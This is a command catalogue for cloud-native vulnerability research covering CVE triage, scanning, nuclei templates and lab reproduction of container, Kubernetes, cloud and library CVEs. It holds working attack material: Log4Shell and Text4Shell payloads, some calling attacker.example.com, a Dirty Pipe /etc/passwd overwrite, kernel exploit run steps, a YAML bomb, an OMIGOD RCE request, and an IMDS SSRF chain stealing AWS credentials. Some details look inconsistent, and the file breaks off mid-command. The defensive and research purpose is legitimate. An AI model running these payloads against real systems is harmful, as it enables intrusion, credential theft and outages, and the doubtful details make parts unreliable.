# Cloud-Native Vulnerability Research Payloads / Command Catalogue

> Companion to `SKILL.md`. Every command is reproducible on Kali Linux 2025-2 (ARM64) after the per-tool install steps in §1.
>
> Placeholder convention: `<target>` is an authorized target URL/IP, `<image>` is a container image reference, `<cve-id>` is a CVE identifier (e.g. `CVE-2026-21858`), `<gh-user>` is your GitHub username, `<advisory-id>` is a GHSA identifier. Replace before running. No real secrets, tokens, or webhook URLs are present in this file.

---

## 1. CVE Triage Methodology

### 1.1 Pull NVD record + CVSS vector

```bash
# Pull the CVE record from NVD
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-21858" \
  | jq '.vulnerabilities[0].cve | {id, descriptions: [.descriptions[] | select(.lang=="en").value][0], cvss: (.metrics.cvssMetricV31[0].cvssData | {baseScore, vectorString}), published, lastModified}'

# Extract the CVSS v3.1 base score and vector
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-44228" \
  | jq '.vulnerabilities[0].cve.metrics.cvssMetricV31[0].cvssData'

# Pull CVSS v4.0 if available (supplemental exploitability metrics)
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2026-21858" \
  | jq '.vulnerabilities[0].cve.metrics.cvssMetricV40 // "no v4.0 yet"'
```

### 1.2 Check CISA KEV catalog

```bash
# Download the KEV catalog
curl -s https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json -o /tmp/kev.json

# Filter for a specific CVE
jq '.vulnerabilities[] | select(.cveID=="CVE-2021-44228")' /tmp/kev.json

# Filter KEV for cloud-native keywords (k8s, container, cloud provider names)
jq '.vulnerabilities[] | select(.product // "" | test("kubernetes|container|docker|openshift|opensuse|ecs|eks|gke|aks|cosmos|omi|azure|aws|gcp"; "i")) | {cveID, product, vendorProject, dateAdded, dueDate}' /tmp/kev.json

# List KEV additions in the last 7 days
jq --arg d "$(date -d '7 days ago' +%Y-%m-%d)" '.vulnerabilities[] | select(.dateAdded > $d) | {cveID, product, dateAdded, dueDate}' /tmp/kev.json
```

### 1.3 EPSS scoring

```bash
# EPSS API — probability of exploitation in next 30 days
curl -s "https://api.first.org/data/v1/epss?cve=CVE-2026-21858" | jq '.data[0]'

# Bulk EPSS lookup for an SBOM's CVE list
jq -r '.matches[].vulnerability.id' grype.json | sort -u > cve-list.txt
curl -s "https://api.first.org/data/v1/epss?cve=$(paste -sd, cve-list.txt)" > epss.json
jq -r '.data[] | "\(.cve) epss=\(.epss) percentile=\(.percentile)"' epss.json | sort -t= -k2 -nr | head -20
```

### 1.4 Cloud-native relevance filter

```bash
# Heuristic: does the CVE affect a cloud-native component?
# Keyword list pulled from CNCF landscape + cloud provider service catalog.
KEYWORDS="kubernetes|container|docker|runc|containerd|cri-o|istio|linkerd|envoy|cilium|calico|etcd|helm|argocd|flux|tekton|knative|kubeedge|openshift|rancher|ecs|eks|gke|aks|fargate|cloudrun|lambda|azure|aws|gcp|cosmos|omi|imds"

# Search NVD recent CVEs by keyword
curl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=kubernetes&resultsPerPage=50" \
  | jq '.vulnerabilities[].cve | {id, description: .descriptions[0].value, cvss: .metrics.cvssMetricV31[0].cvssData.baseScore}'

# Cross-reference GitHub Advisory Database
gh api -X GET '/advisories?keyword=kubernetes&severity=critical' --paginate \
  | jq '.[] | {ghsaId, cveId, summary, severity}'
```

### 1.5 Exploit availability check

```bash
# searchsploit (local exploitdb)
searchsploit log4shell
searchsploit -x 50546    # examine a specific exploit

# Sploitus (online)
curl -s "https://sploitus.com/?query=CVE-2026-21858&output=json" | jq

# Vulners API
curl -s "https://vulners.com/api/v3/search/lucene/?query=CVE-2021-44228" | jq '.data.search[] | {_source: ._source.id}'

# GitHub PoC search
gh search repos "CVE-2026-21858" --limit 10
gh search code "CVE-2026-21858" --extension py --limit 20
```

---

## 2. Patch Diff Analysis

### 2.1 git log/diff between vulnerable and patched versions

```bash
# Clone the upstream repo
git clone https://github.com/spring-projects/spring-framework
cd spring-framework

# Identify the fix commit (search the changelog / release notes)
git log --oneline v5.3.17..v5.3.18 | head

# Diff the suspect module
git diff v5.3.17..v5.3.18 -- spring-web/src/main/java/org/springframework/web/bind/

# Annotate a line of interest to find the introducing commit
git blame spring-web/src/main/java/org/springframework/web/bind/annotation/RequestMappingHandlerMapping.java | head -30

# Find commits that touched a specific function
git log -S "WebDataBinder" --oneline
```

### 2.2 gh advisory view

```bash
# Read the advisory metadata (Spring4Shell reference GHSA-rqg7-js5h-mx8w)
gh advisory view GHSA-rqg7-js5h-mx8w

# Pull the affected version ranges
gh api repos/spring-projects/spring-framework/security-advisories \
  | jq '.[] | select(.ghsa_id=="GHSA-36p3-wjjm-8x6p") | {summary, severity, identifiers, references}'
```

### 2.3 BinDiff for binary-only patches

```bash
# Requires Ghidra or IDA Pro headless export to BinExport format.
# Step 1: disassemble both versions with Ghidra headless
#   $GHIDRA_HOME/support/analyzeHeadless /tmp proj vuln \
#     -import vulnerable.so -postScript ExportBinExport.java -deleteProject
# Step 2: open both .BinExport files in BinDiff, run "Compare"
# Step 3: inspect "functions with changes" — focus on:
#   - Functions newly added (likely the fix)
#   - Functions with matched/similar confidence (likely the fix is here)
#   - Call graph differences (caller / callee changes)

# Diaphora (free alternative, Ghidra/IDA plugin)
# Export vulnerable.so to .sqlite, patched.so to .sqlite
# In Diaphora: Diff > Best-Match on the two .sqlite files.

# PatchDiff (older tool, less common today)
patchdiff vulnerable.so patched.so > diff.txt
```

### 2.4 Distill a detection signature from the diff

```bash
# After reviewing the diff, distill a Yara rule for memory scanning
cat > CVE-2026-21858.yar <<EOF
rule CVE_2026_21858_Acme_AuthBypass_Patch
{
    meta:
        description = "Acme Web UI - patched auth check for CVE-2026-21858"
        cve = "CVE-2026-21858"
        date = "2026-04-15"
    strings:
        $fix = "X-Real-Ip check" ascii
        $vuln = "Bypassed" ascii
    condition:
        $vuln and not $fix
}
EOF
yara CVE-2026-21858.yar /path/to/scanned/binary

# Or a Suricata signature for network detection
cat > CVE-2026-21858.rules <<EOF
alert http any any -> any any (msg:"CVE-2026-21858 Acme Web UI auth bypass attempt"; \
  flow:established,to_server; http.method; content:"GET"; \
  http.uri; content:"/admin/console"; \
  http.header; content:"Authorization|3a| Bypassed"; \
  classtype:attempted-admin; sid:1000001; rev:1;)
EOF
suricata -T -c suricata.yaml -S CVE-2026-21858.rules
```

---

## 3. Lab Setup (Docker / kind / minikube / QEMU)

### 3.1 Docker snapshot-rollback lab

```bash
# Start a vulnerable container
docker run -d --name lab-vuln -p 8080:8080 vuln/log4shell:2.14.0

# Snapshot before PoC (commit to an image tag)
docker commit lab-vuln lab-vuln:pre-poc

# Run the PoC
curl -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}' http://localhost:8080/

# Capture state for forensics
docker exec lab-vuln sh -c 'ls /tmp/' > /tmp/before-rollback.txt

# Rollback
docker stop lab-vuln && docker rm lab-vuln
docker run -d --name lab-vuln -p 8080:8080 lab-vuln:pre-poc
```

### 3.2 kind (Kubernetes-in-Docker) for cluster CVEs

```bash
# Install kind
go install sigs.k8s.io/kind@latest

# Spin up a 1.20 cluster (vulnerable to CVE-2021-25735 etc.)
cat > kind-config.yaml <<EOF
apiVersion: kind.x-k8s.io/v1alpha4
kind: Cluster
nodes:
  - role: control-plane
    image: kindest/node:v1.20.15@sha256:393fb907dfcf31536ee19b8a0538dde983aa89d125c845825d2c2d4318ab2e8a
EOF
# Replace the image digest with a real one from kind release notes:
#   kindest/node:v1.20.15@sha256:393fb907dfcf31536ee19b8a0538dde983aa89d125c845825d2c2d4318ab2e8a
kind create cluster --config kind-config.yaml --name vuln-cluster

# Confirm the cluster version
kubectl version --short
kubectl get nodes

# Run the CVE PoC (example: CVE-2018-1002105 requires an older 1.x version)
# kind supports multi-node:
cat > kind-multi.yaml <<EOF
apiVersion: kind.x-k8s.io/v1alpha4
kind: Cluster
nodes:
  - role: control-plane
  - role: worker
  - role: worker
EOF
kind create cluster --config kind-multi.yaml --name multi

# Snapshot the lab (kind nodes are Docker containers)
docker commit multi-control-plane multi-control-plane:pre-poc

# Teardown
kind delete cluster --name vuln-cluster
```

### 3.3 minikube + k3d

```bash
# minikube (single-node, mature drivers)
curl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-arm64
sudo install minikube-linux-arm64 /usr/local/bin/minikube
minikube start --kubernetes-version=v1.22.0 --driver=docker
minikube ssh -- docker ps

# k3d (k3s in Docker — lightweight, ARM64-friendly)
curl -s https://raw.githubusercontent.com/k3d-io/k3d/main/install.sh | bash
k3d cluster create vuln --agents 2 --image rancher/k3s:v1.22.5-k3s1
kubectl get nodes
```

### 3.4 QEMU multi-arch for kernel CVEs

```bash
# Install QEMU + binfmt for cross-arch
sudo apt install -y qemu-system qemu-user-static binfmt-support
docker run --rm --privileged multiarch/qemu-user-static --reset -p yes

# Verify arm64 binaries run on x86
docker run --rm --platform linux/arm64 alpine uname -m
# Expected: aarch64

# Run a kernel-vulnerable VM via cloud-init
# Download a vulnerable kernel Debian/Ubuntu cloud image
# Boot with QEMU and the kernel of choice:
qemu-system-aarch64 -M virt -cpu cortex-a72 -smp 2 -m 2048 \
  -drive file=ubuntu-20.04-server-cloudimg-arm64.img,if=virtio \
  -kernel vuln-vmlinuz -initrd vuln-initrd \
  -append "root=/dev/vda1 console=ttyAMA0" \
  -netdev user,id=net0,hostfwd=tcp::2222-:22 -device virtio-net-device,netdev=net0 \
  -nographic
```

### 3.5 Network isolation guard

```bash
# Always verify the lab has NO outbound internet (only LAN/loopback)
# Docker: custom bridge with --internal
docker network create --internal lab-iso-net
docker run -d --name lab-vuln --network lab-iso-net -p 127.0.0.1:8080:8080 vuln/log4shell:2.14.0

# Verify no outbound
docker exec lab-vuln sh -c 'curl -m 3 https://example.com' || echo "outbound blocked"

# For kind: edit kind-config.yaml to set networkPlugin.none and use a custom CNI
# (advanced; see kind docs on custom CNI)
```

---

## 4. SBOM Generation

### 4.1 syft — image, filesystem, archive

```bash
# Install syft
curl -sSfL https://raw.githubusercontent.com/anchore/syft/main/install.sh | sh -s -- -b /usr/local/bin

# Generate SPDX JSON SBOM from an image
syft myrepo/app:v1 -o spdx-json > sbom.spdx.json

# Generate CycloneDX from a directory
syft dir:./src -o cyclonedx-json > sbom.cdx.json

# Generate SBOM from a tarball
syft archive:app.tar.gz -o spdx-json > sbom.spdx.json

# Multi-arch: scan each platform separately
syft --platform linux/arm64 myrepo/app:v1 -o spdx-json > sbom-arm64.spdx.json
syft --platform linux/amd64 myrepo/app:v1 -o spdx-json > sbom-amd64.spdx.json
```

### 4.2 tern — deeper image analysis

```bash
# Install tern
pip3 install tern

# Generate an SBOM with layer-by-layer detail
tern report --image myrepo/app:v1 --format spdx-json -o sbom-tern.spdx.json

# Inspect a single layer
tern lock --image myrepo/app:v1 --layer 3
```

### 4.3 sbom-explorer / SPDX tools

```bash
# spdx-tools-python for SPDX validation
pip3 install spdx-tools
pyspdxtools --file sbom.spdx.json

# sbom-explorer (https://github.com/interlynk-io/sbomex)
sbomex search --package log4j --format spdx
```

### 4.4 CycloneDX CLI

```bash
# CycloneDX CLI for diffing two SBOMs (useful for tracking changes between image versions)
npm install -g @cyclonedx/cyclonedx-cli
cyclonedx diff --input-file sbom-v1.cdx.json --other-file sbom-v2.cdx.json --output-format json > diff.json
```

---

## 5. Vulnerability Scanning

### 5.1 trivy — image, k8s, fs, IaC

```bash
# Image scan — HIGH+CRITICAL, only-fixed
trivy image --severity HIGH,CRITICAL --only-fixed myrepo/app:v1

# JSON output for downstream triage
trivy image --format json --output trivy.json --severity HIGH,CRITICAL myrepo/app:v1

# K8s cluster scan (audit + images + IaC)
trivy k8s cluster --report summary
trivy k8s cluster --report summary -n kube-system

# Filesystem scan (catches deps in source)
trivy fs --severity HIGH,CRITICAL ./src

# IaC scan (Terraform, CloudFormation, K8s manifests)
trivy config ./terraform/
```

### 5.2 grype — against SBOM or image

```bash
# Install grype
curl -sSfL https://raw.githubusercontent.com/anchore/grype/main/install.sh | sh -s -- -b /usr/local/bin

# Scan an SBOM
grype sbom:sbom.spdx.json --severity high,critical --only-fixed

# Scan an image directly
grype myrepo/app:v1 --severity high,critical

# JSON output for triage
grype sbom:sbom.spdx.json -o json > grype.json

# Fail-on for CI
grype sbom:sbom.spdx.json --fail-on high
```

### 5.3 osv-scanner — OSV.dev backend

```bash
# Install osv-scanner
go install github.com/google/osv-scanner/cmd/osv-scanner@latest

# Scan a lockfile
osv-scanner --lockfile package-lock.json
osv-scanner --lockfile Pipfile.lock
osv-scanner --lockfile go.mod

# Scan an SBOM
osv-scanner --sbom=sbom.spdx.json

# Scan a directory recursively
osv-scanner -r ./src --format json -o osv.json
```

### 5.4 Differential scanning between image versions

```bash
# Compare vuln deltas between two image versions
trivy image --format json -o v1.json myrepo/app:v1
trivy image --format json -o v2.json myrepo/app:v2

# Diff using jq
jq -r '.Results[].Vulnerabilities[]?.VulnerabilityID' v1.json | sort -u > v1.cves
jq -r '.Results[].Vulnerabilities[]?.VulnerabilityID' v2.json | sort -u > v2.cves
echo "=== CVEs fixed in v2 ===" && comm -23 v1.cves v2.cves
echo "=== CVEs newly introduced in v2 ===" && comm -13 v1.cves v2.cves
```

---

## 6. nuclei Template Authoring

### 6.1 YAML schema — required fields

```yaml
id: CVE-2026-21858

info:
  name: Acme Web UI - Auth Bypass
  author: brucesong
  severity: critical
  description: |
    Acme Web UI versions prior to 3.4.2 fail to properly validate Authorization
    headers, allowing unauthenticated attackers to access the admin console.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2026-21858
    - https://github.com/acme/web-ui/security/advisories/GHSA-xxxx-xxxx-xxxx
    - https://www.acme.com/blog/cve-2026-21858-security-advisory
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2026-21858
    cwe-id: CWE-287
  metadata:
    verified: true
    max-request: 2
    shodan-query: "http.title:\"Acme Web UI\""
    fofa-query: "title=\"Acme Web UI\""
  tags: cve,cve2026,acme,auth-bypass,intrusive
```

### 6.2 HTTP matcher examples

```yaml
http:
  - method: GET
    path:
      - "{{BaseURL}}/admin/console"
    headers:
      Authorization: "Bypassed"
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "Admin Console"
          - "Version 3.4"
        condition: and
      - type: status
        status:
          - 200

  - method: GET
    path:
      - "{{BaseURL}}/api/version"
    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - '"version":\s*"3\.[0-3]\.[0-9]+"'
      - type: dsl
        dsl:
          - 'status_code == 200 && contains(body, "vulnerable_feature")'
```

### 6.3 DNS matcher example

```yaml
id: CVE-2026-33017-DNS-Rebind

info:
  name: Acme DNS - Rebinding via TXT record
  author: brucesong
  severity: high
  classification:
    cve-id: CVE-2026-33017

dns:
  - name: "{{FQDN}}"
    type: TXT
    matchers:
      - type: word
        words:
          - "vulnerable-marker"
```

### 6.4 Network / TCP matcher

```yaml
id: CVE-2026-21900-TelnetRCE

info:
  name: Acme Telnet - Unauthenticated RCE
  author: brucesong
  severity: critical

tcp:
  - host: "{{Hostname}}"
    port: 23
    inputs:
      - data: "ACME_BACKDOOR\r\n"
    matchers:
      - type: word
        words:
          - "root@acme"
```

### 6.5 Workflow with conditionals

```yaml
id: acme-exploit-chain-workflow

info:
  name: Acme exploit chain (CVE-2026-21858 → CVE-2026-21900)
  author: brucesong

workflows:
  - template: cves/2026/CVE-2026-21858.yaml
    subtemplates:
      - template: cves/2026/CVE-2026-21900.yaml
```

---

## 7. nuclei Template Workflow (PR to projectdiscovery/nuclei-templates)

### 7.1 Validate locally

```bash
# Update templates
nuclei -update-templates

# Lint the template
nuclei -t my-templates/CVE-2026-21858.yaml -validate

# Run against a known-vulnerable target (your lab)
nuclei -t my-templates/CVE-2026-21858.yaml -u http://127.0.0.1:8080

# Run against a known-patched target (your lab at patched version)
nuclei -t my-templates/CVE-2026-21858.yaml -u http://127.0.0.1:8081
# Expect: 1 match on vuln, 0 on patched.

# Run with -rate-limit to be polite
nuclei -t my-templates/CVE-2026-21858.yaml -u http://target -rate-limit 10 -bulk-size 5
```

### 7.2 Fork, branch, PR

```bash
# Fork projectdiscovery/nuclei-templates on GitHub, then:
git clone https://github.com/<gh-user>/nuclei-templates
cd nuclei-templates
git remote add upstream https://github.com/projectdiscovery/nuclei-templates
git fetch upstream
git checkout -b add-CVE-2026-21858 upstream/main

# Place the template under cves/2026/CVE-2026-21858.yaml
mkdir -p cves/2026
cp /path/to/my-templates/CVE-2026-21858.yaml cves/2026/

# Run CI checks locally
nuclei -validate -t cves/2026/CVE-2026-21858.yaml

# Commit and push
git add cves/2026/CVE-2026-21858.yaml
git commit -m "add CVE-2026-21858 Acme Web UI auth bypass template"
git push -u origin add-CVE-2026-21858

# Open the PR
gh pr create --title "Add CVE-2026-21858 (Acme Web UI Auth Bypass)" \
  --body "$(cat <<'EOF'
## Description
- Adds nuclei template for CVE-2026-21858 (Acme Web UI Auth Bypass, CVSS 9.8)
- Validated against a local vuln+patched lab (see reference below)
- Reference: https://github.com/acme/web-ui/security/advisories/GHSA-xxxx-xxxx-xxxx

## Validation
- [x] `nuclei -validate` passes
- [x] Tested against vuln target → 1 match
- [x] Tested against patched target → 0 matches
EOF
)"
```

### 7.3 False-positive triage

```bash
# If reviewers report FPs, gather diagnostics:
nuclei -t cves/2026/CVE-2026-21858.yaml -u http://target -debug -request-export /tmp/reqs.txt
cat /tmp/reqs.txt

# Tighten matchers: require multiple unique strings, restrict status codes
# Use -no-color for clean logs in the PR discussion
nuclei -t my-templates/CVE-2026-21858.yaml -u http://target -no-color | tee /tmp/run.log

# If a FP needs a more specific matcher, edit the YAML:
#   matchers-condition: and (require all)
#   add: - type: word (a second unique string from the vuln response)
```

### 7.4 April 2026 AI/LLM template push

```bash
# ProjectDiscovery April 2026 release added new AI/LLM-specific template categories.
# Pull the latest templates
nuclei -update-templates

# List the new AI/LLM templates
ls ~/nuclei-templates/http/cves/2026/ | grep -i -E 'llm|ai|prompt'

# Run them against an authorized LLM endpoint
nuclei -t ~/nuclei-templates/http/exposures/ai/ -u https://llm-target.local

# Reference: https://github.com/projectdiscovery/nuclei-templates/releases/tag/v10.0.0
```

---

## 8. Container Escape CVEs

### 8.1 CVE-2019-5736 (runc)

```bash
# Affects runc < 1.0-rc6. Container escape via runc binary overwrite.
# Reproduce in lab (USE ONLY ON YOUR OWN SYSTEM):
docker run --rm -it --name vuln-runc ubuntu:18.04 /bin/bash

# Inside the container, the PoC overwrites /proc/self/exe (which is the host runc)
# when an exec is triggered via docker exec. See:
#   https://github.com/Frichetten/CVE-2019-5736-PoC
git clone https://github.com/Frichetten/CVE-2019-5736-PoC
cd CVE-2019-5736-PoC
go build main.go
# Run the PoC, then trigger a docker exec from another terminal to overwrite runc.

# Detection (post-compromise): runc binary modified after package install
stat /usr/bin/docker-runc
sha256sum /usr/bin/docker-runc   # compare against package-managed hash
```

### 8.2 CVE-2022-0185 (Linux kernel fs/context heap overflow)

```bash
# Affects Linux kernel < 5.16.5 (and backports). Container escape + LPE.
# PoC: https://github.com/Crusaders-of-Rust/CVE-2022-0185
git clone https://github.com/Crusaders-of-Rust/CVE-2022-0185
cd CVE-2022-0185
gcc -o exploit exploit.c

# Run in a container with CAP_SYS_ADMIN + user namespaces enabled
docker run --rm -it --security-opt systempaths=unconfined \
  --cap-add=SYS_ADMIN --security-opt apparmor=unconfined \
  ubuntu:20.04 bash
./exploit
# Result: root on the host.

# Detection: kernel log "heap overflow in legacy_parse_param"
dmesg | grep -i legacy_parse_param
```

### 8.3 CVE-2021-30465 (runc symlink exchange)

```bash
# Affects runc < 1.0.0-rc95. Symlink exchange on overlayfs during mount.
# PoC requires mounting crafted overlayfs; see advisory writeup.
# Reference: https://nvd.nist.gov/vuln/detail/CVE-2021-30465

# Defense: upgrade runc, disable user namespaces if unused.
```

### 8.4 CVE-2022-0847 (Dirty Pipe)

```bash
# Affects Linux kernel 5.8–5.16.10, 5.15.24–5.16.10. LPE + container escape.
# PoC: https://github.com/AlexisAhmadi/CVE-2022-0847
gcc -o exploit exploit.c
./exploit /etc/passwd 1 root::0:0::/bin/bash

# Container escape variant: overwrite /proc/self/exe (host runc binary)
# Detection: kernel >= 5.16.11 or backported fix.
uname -r
```

---

## 9. Kubernetes CVEs

### 9.1 CVE-2018-1002105 (API server privilege escalation)

```bash
# Affects k8s 1.8–1.14. Unauthenticated → cluster-admin via HTTP/2.
# Reproduce: stand up a vulnerable cluster (kind with v1.10 image)
kind create cluster --image kindest/node:v1.10.13

# Send the malicious HTTP/2 request
# (PoC private; reference: https://nvd.nist.gov/vuln/detail/CVE-2018-1002105)
# Detection: API server logs showing anonymous requests with high-priv verbs.
kubectl get --raw='/api/v1/namespaces/kube-system/secrets' \
  --as=system:anonymous --v=8
```

### 9.2 CVE-2019-11253 (YAML bomb DoS)

```bash
# Affects k8s < 1.12.5, 1.13.0–1.13.11, 1.14.0–1.14.7.
# PoC: a crafted YAML that causes the API server to allocate gigabytes of memory.
cat > bomb.yaml <<EOF
apiVersion: v1
kind: ConfigMap
metadata:
  name: bomb
data:
  payload.yaml: |
    # 1MB YAML that expands to ~1GB when parsed (anchor explosion)
    a: &a ["lol","lol","lol","lol","lol","lol","lol","lol","lol"]
    b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]
    c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]
    # ... continue multiplying
EOF
# Detection: API server OOMKilled; pods restart.
kubectl apply -f bomb.yaml
```

### 9.3 CVE-2022-3162 (authn bypass)

```bash
# Affects k8s 1.22–1.24. Users could bypass Aggregated API server auth.
# Reference: https://nvd.nist.gov/vuln/detail/CVE-2022-3162
# Defense: upgrade to 1.22.14+, 1.23.11+, 1.24.5+, 1.25.0+.
kubectl version --short
```

### 9.4 CVE-2023-2728 (Node Restriction bypass)

```bash
# Affects k8s < 1.24.14, 1.25.x < 1.25.10, 1.26.x < 1.26.5.
# Node authorizer/Restriction bypass: a kubelet could act on behalf of other nodes.
# Detection: kubelet audit log shows unexpected node identity mutations.
```

---

## 10. Service Mesh / Istio CVEs

### 10.1 CVE-2023-35881 (Envoy header smuggling)

```bash
# Affects Envoy < 1.26.4, 1.25.7, 1.24.9. Header smuggling via crafted HTTP/1.
# Detection: Envoy logs show unexpected :authority header splits.
# Reproduce in lab:
docker run -d --name envoy-vuln -p 10000:10000 \
  envoyproxy/envoy:v1.26.0 -c /etc/envoy/envoy.yaml

curl -H $'Host: a\r\nX-Inject: injected' http://localhost:10000/
```

### 10.2 CVE-2023-44487 (HTTP/2 Rapid Reset)

```bash
# Affects most HTTP/2 servers including Istio/envoy < patched versions.
# DoS via rapid stream reset. Reproduce with the h2load PoC:
apt install -y nghttp2-client
h2load -n 1000 -c 10 -m 1000 --rst-stream-after-10ms https://target.local
# Defense: envoy 1.27.4+, istio 1.19.5+/1.20.2+.
```

---

## 11. Cloud Provider CVEs

### 11.1 OMIGOD (CVE-2021-38645, CVE-2021-38649, CVE-2021-38650, CVE-2021-38651)

```bash
# Affects Azure Open Management Infrastructure (OMI) agent on Linux VMs.
# Unauthenticated RCE on TCP 5985/5986 (OMI HTTP listener).
# PoC: https://github.com/AlteredSecurity/CVE-2021-38645
# Reference repo: https://github.com/microsoft/omi (vendor)
# Vendor advisory: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38645
# Research writeup: https://www.wiz.io/blog/omigod-critical-vulnerabilities-in-omi-azure

# Probe for the listener
nmap -p 5985,5986 --open <azure-vm-ip>

# Send the malicious SOAP request (unauthenticated ExecuteShellCommand)
curl -sk -X POST http://<azure-vm-ip>:5985/wsman \
  -H 'Content-Type: application/soap+xml;charset=UTF-8' \
  --data @omigod-payload.xml
```

### 11.2 Chaos DB (CVE-2021-42306)

```bash
# Azure Cosmos DB Jupyter notebook vulnerability — cross-customer data access.
# No customer-side PoC; the vulnerability was in the Cosmos DB service itself.
# Reference: https://www.wiz.io/blog/chaosdb-explained-azures-cosmos-db-vulnerability

# Customer mitigation: rotate Cosmos DB keys, audit notebook access logs.
az cosmosdb list-keys -g <rg> -n <cosmos-name> --query primaryMasterKey
# (Output placeholder: REPLACE_WITH_YOUR_COSMOS_KEY)
```

### 11.3 AWS IMDSv1 SSRF chain

```bash
# Not a CVE per se, but a class of SSRF → IMDSv1 → role credentials exploit.
# Reproduce in a lab with a vulnerable instance role.
# Step 1: SSRF in the app leaks IMDS response
curl -s 'http://vuln-app.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
# Returns the role name.

# Step 2: Get the credentials
curl -s 'http://vuln-app.local/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>'

# Step 3: Use them from your machine
export AWS_ACCESS_KEY_ID=<leaked>
export AWS_SECRET_ACCESS_KEY=<leaked>
export AWS_SESSION_TOKEN=<leaked>
aws sts get-caller-identity

# Defense: enforce IMDSv2 (Hop-Limit=1, HttpTokens=required).
aws ec2 modify-instance-metadata-options --instance-id i-xxx \
  --http-tokens required --http-endpoint enabled --http-put-response-hop-limit 1
```

---

## 12. JVM / Library CVEs

### 12.1 Log4Shell (CVE-2021-44228)

```bash
# Affects log4j-core 2.0–2.14.1. JNDI injection → RCE.
# Reproduce in lab:
docker run -d --name log4shell-lab -p 8080:8080 \
  ghcr.io/pojavzn/vulnlab-log4shell:2.14.0

# Stand up a malicious LDAP/JNDI server
git clone https://github.com/feihong-cs/JNDIExploit
cd JNDIExploit && java -jar JNDIExploit.jar -i 127.0.0.1 -p 1389 &

# Payload (header vector)
curl -sv -H 'X-Api-Version: ${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}' \
  http://localhost:8080/

# Verify RCE
docker exec log4shell-lab ls /tmp/pwned

# Detection: log entries containing ${jndi:...}; DNS exfil to attacker domain.
```

### 12.2 Spring4Shell (CVE-2022-22965)

```bash
# Affects Spring Framework < 5.3.18, 5.2.20. RCE via data binding.
# Reproduce in lab:
docker run -d --name spring4shell-lab -p 8080:8080 \
  vuln/spring4shell:5.3.17

# PoC: https://github.com/BobTheShoplifter/Spring4Shell-POC
git clone https://github.com/BobTheShoplifter/Spring4Shell-POC
cd Spring4Shell-POC && python3 exploit.py --url http://localhost:8080/

# Detection: requests with class.module.classLoader resources access.
```

### 12.3 Text4Shell (CVE-2022-42889)

```bash
# Affects Apache Commons Text < 1.10.0. StringSubstitutor lookup RCE.
# PoC:
curl 'http://vuln-app.local/search?q=${script:javascript:3*3}'
curl 'http://vuln-app.local/search?q=${dns:addr|attacker.example.com}'
curl 'http://vuln-app.local/search?q=${url:utf-8:http://attacker.example.com/payload}'

# Detection: log entries with ${script:...}, ${dns:...}, ${url:...}.
```

---

## 13. Kernel CVEs in Containers

### 13.1 CVE-2021-22555 (netfilter LPE)

```bash
# Affects Linux kernel < 5.12.13. Heap OOB write in netfilter.
# PoC: https://github.com/google/security-research/tree/master/pocs/linux/cve-2021-22555
git clone https://github.com/google/security-research
cd security-research/pocs/linux/cve-2021-22555
gcc -o exploit exploit.c -lm
./exploit    # Result: root on the host.
```

### 13.2 CVE-2022-0185 (already covered in §8.2)

```bash
# Same PoC, container-escape variant — see §8.2.
```

### 13.3 CVE-2022-0847 Dirty Pipe (already covered in §8.4)

```bash
# Same PoC — see §8.4.
```

### 13.4 CVE-2024-1086 (netfilter nf_tables UAF)

```bash
# Affects Linux kernel 5.14–6.6. UAF in nf_tables.
# PoC: https://github.com/Notselwyn/CVE-2024-1086
git clone https://github.com/Notselwyn/CVE-2024-1086
cd CVE-2024-1086
gcc -o exploit exploit.c
./exploit
```

---

## 14. CI/CD Supply Chain CVEs

### 14.1 Codecov bash uploader compromise (2021)

```bash
# The Codecov bash uploader was modified by an attacker (Jan 2021 – Apr 2021)
# to exfiltrate environment variables from CI runs.
# Reference: https://about.codecov.io/security-update/

# Blast radius: any CI that ran `bash <(curl -s https://codecov.io/bash)`
# between Jan 31 and Apr 1, 2021.

# Detection: check CI logs for the compromised uploader
grep -rE 'codecov\.io/bash|codecov-bash' .github/workflows/ .gitlab-ci.yml Jenkinsfile

# Mitigation: rotate all CI secrets (env vars, tokens), upgrade to the
# new Codecov CLI.
```

### 14.2 SolarWinds SUNBURST (CVE-2020-10148)

```bash
# Affects SolarWinds Orion Platform < 2020.2.1 HF 2.
# Backdoor in the OrionCoreIntegrationEngine.dll.
# Reference: https://nvd.nist.gov/vuln/detail/CVE-2020-10148

# Detection: HTTP GET/PUT to /SolarWinds/InformationService/v3/Json/
# with malicious-encoded URI.
# Defender Yara rule for SUNBURST DLL:
cat > SUNBURST.yar <<EOF
rule SUNBURST_Backdoor
{
    meta:
        description = "SUNBURST backdoor DLL"
        hash = "b91ce2fa41029f8a648f34d1d0ab84dbb0b7ab1d"
    strings:
        $s1 = "SolarWinds.Orion.Core.BusinessLayer.dll" ascii
        $s2 = "appsvc.dll" ascii
    condition:
        $s1 and $s2
}
EOF
yara SUNBURST.yar /path/to/suspect.dll
```

### 14.3 Dependency confusion (no CVE, but a class)

```bash
# Affects package managers that mix internal + public registries.
# Attack: publish a public package with the same name as an internal one
# and a higher version number.

# Defense: scope internal packages (npm: --scope), pin versions, use a private
# registry proxy (Artifactory, Nexus, Verdaccio) with name allow-listing.

# Detection: package-lock.json / yarn.lock / Pipfile.lock containing
# registry URLs that point outside the approved registry.
jq -r '.dependencies | to_entries[] | "\(.key)@\(.value)"' package-lock.json \
